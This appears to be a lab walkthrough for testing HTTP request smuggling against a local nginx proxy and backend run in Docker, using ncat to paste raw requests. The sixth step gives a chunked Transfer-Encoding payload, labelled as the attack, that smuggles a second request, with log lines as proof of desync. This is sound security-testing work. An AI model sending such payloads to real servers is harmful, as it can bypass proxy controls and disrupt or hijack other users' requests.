1️⃣ Start the lab (clean start – always do this)

From the project root:

docker compose down -v
docker compose build --no-cache
docker compose up


Wait until containers stabilize.

2️⃣ Verify containers are running
docker ps


Expected:

backend-app → Up (healthy)

nginx-proxy → Up

If nginx exits → check config before proceeding.

3️⃣ Sanity check: basic HTTP routing
curl.exe http://localhost:8080/health


Expected output:

HTTP/1.1 200 OK
OK


If this fails → stop. Fix proxying first.

4️⃣ Open an interactive raw TCP session (IMPORTANT)

This is the key step for the lab.

& "C:\Program Files (x86)\Nmap\ncat.exe" localhost 8080


You will see no output.
This is correct — the TCP connection is open.

⚠️ Do not close this terminal until the lab is finished.

5️⃣ Baseline test: multiple requests on ONE connection
Request #1

Paste exactly:

GET /health HTTP/1.1
Host: localhost



Expected response:

HTTP/1.1 200 OK
OK

Request #2 (same connection)

Without restarting ncat, paste:

GET /health HTTP/1.1
Host: localhost



Expected response:

HTTP/1.1 200 OK
OK


✅ This confirms:

Keep‑alive works

Multiple requests per connection

Backend reuse

6️⃣ The actual HRS test (desync trigger)

Now comes the attack payload.

Paste all of this at once into the SAME ncat session:

POST /login HTTP/1.1
Host: localhost
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

e
username=alice
0

GET /health HTTP/1.1
Host: localhost



Press Enter once more.

7️⃣ Expected behavior (this is critical)
On the client (ncat)

You may get no response

The connection may appear “stuck”

⚠️ This is EXPECTED in HRS.

Check Nginx logs (proof)

Open a new terminal:

docker logs nginx-proxy


You should see entries like:

POST /login status=500 conn_reqs=3
GET /health status=200 conn_reqs=4
POST /login status=500 conn_reqs=5
GET /health status=200 conn_reqs=6


Key indicators:

Same conn

Increasing conn_reqs

Requests processed without matching client responses